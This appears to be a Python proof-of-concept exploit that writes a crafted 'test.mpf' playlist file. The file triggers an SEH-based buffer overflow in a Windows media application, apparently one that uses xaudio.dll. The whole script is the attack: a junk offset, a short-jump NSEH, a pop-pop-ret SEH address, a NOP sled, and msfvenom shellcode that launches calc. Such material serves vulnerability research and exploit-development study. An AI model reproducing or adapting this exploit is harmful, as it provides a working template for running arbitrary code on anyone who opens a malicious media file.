def main():
	filename = "test.mpf"
	prepend = "http://"
  # NSEH offset is 4105
  # SEH offset is 4109
	junk = "A" * 4105
  # Jump over some null bytes that break up the shellcode following SEH
	nseh = "\xeb\x1e\x90\x90"
  # pop pop ret instruction found in xaudio.dll with findjmp.exe
	seh = "\x93\x55\x01\x10"
  # nops needed following the jump to allow a smooth transition to shellcode
	nops = "\x90" * 24
  # msfvenom -p windows/exec CMD="calc" -f python -b "\x00\x20\x0a\x0d\x1a"
	buf =  ""
	buf += "\xb8\xd9\x87\xf7\x77\xd9\xce\xd9\x74\x24\xf4\x5a\x31"
	buf += "\xc9\xb1\x30\x31\x42\x13\x03\x42\x13\x83\xc2\xdd\x65"
	buf += "\x02\x8b\x35\xeb\xed\x74\xc5\x8c\x64\x91\xf4\x8c\x13"
	buf += "\xd1\xa6\x3c\x57\xb7\x4a\xb6\x35\x2c\xd9\xba\x91\x43"
	buf += "\x6a\x70\xc4\x6a\x6b\x29\x34\xec\xef\x30\x69\xce\xce"
	buf += "\xfa\x7c\x0f\x17\xe6\x8d\x5d\xc0\x6c\x23\x72\x65\x38"
	buf += "\xf8\xf9\x35\xac\x78\x1d\x8d\xcf\xa9\xb0\x86\x89\x69"
	buf += "\x32\x4b\xa2\x23\x2c\x88\x8f\xfa\xc7\x7a\x7b\xfd\x01"
	buf += "\xb3\x84\x52\x6c\x7c\x77\xaa\xa8\xba\x68\xd9\xc0\xb9"
	buf += "\x15\xda\x16\xc0\xc1\x6f\x8d\x62\x81\xc8\x69\x93\x46"
	buf += "\x8e\xfa\x9f\x23\xc4\xa5\x83\xb2\x09\xde\xbf\x3f\xac"
	buf += "\x31\x36\x7b\x8b\x95\x13\xdf\xb2\x8c\xf9\x8e\xcb\xcf"
	buf += "\xa2\x6f\x6e\x9b\x4e\x7b\x03\xc6\x04\x7a\x91\x7c\x6a"
	buf += "\x7c\xa9\x7e\xda\x15\x98\xf5\xb5\x62\x25\xdc\xf2\x9d"
	buf += "\x6f\x7d\x52\x36\x36\x17\xe7\x5b\xc9\xcd\x2b\x62\x4a"
	buf += "\xe4\xd3\x91\x52\x8d\xd6\xde\xd4\x7d\xaa\x4f\xb1\x81"
	buf += "\x19\x6f\x90\xe1\xfc\xe3\x78\xe6"
	attack_string = prepend + junk + nseh + seh + nops + buf
	
	file = open(filename,"w")
	file.write(attack_string)
	file.close()
	
	

if __name__ == '__main__':
	main()
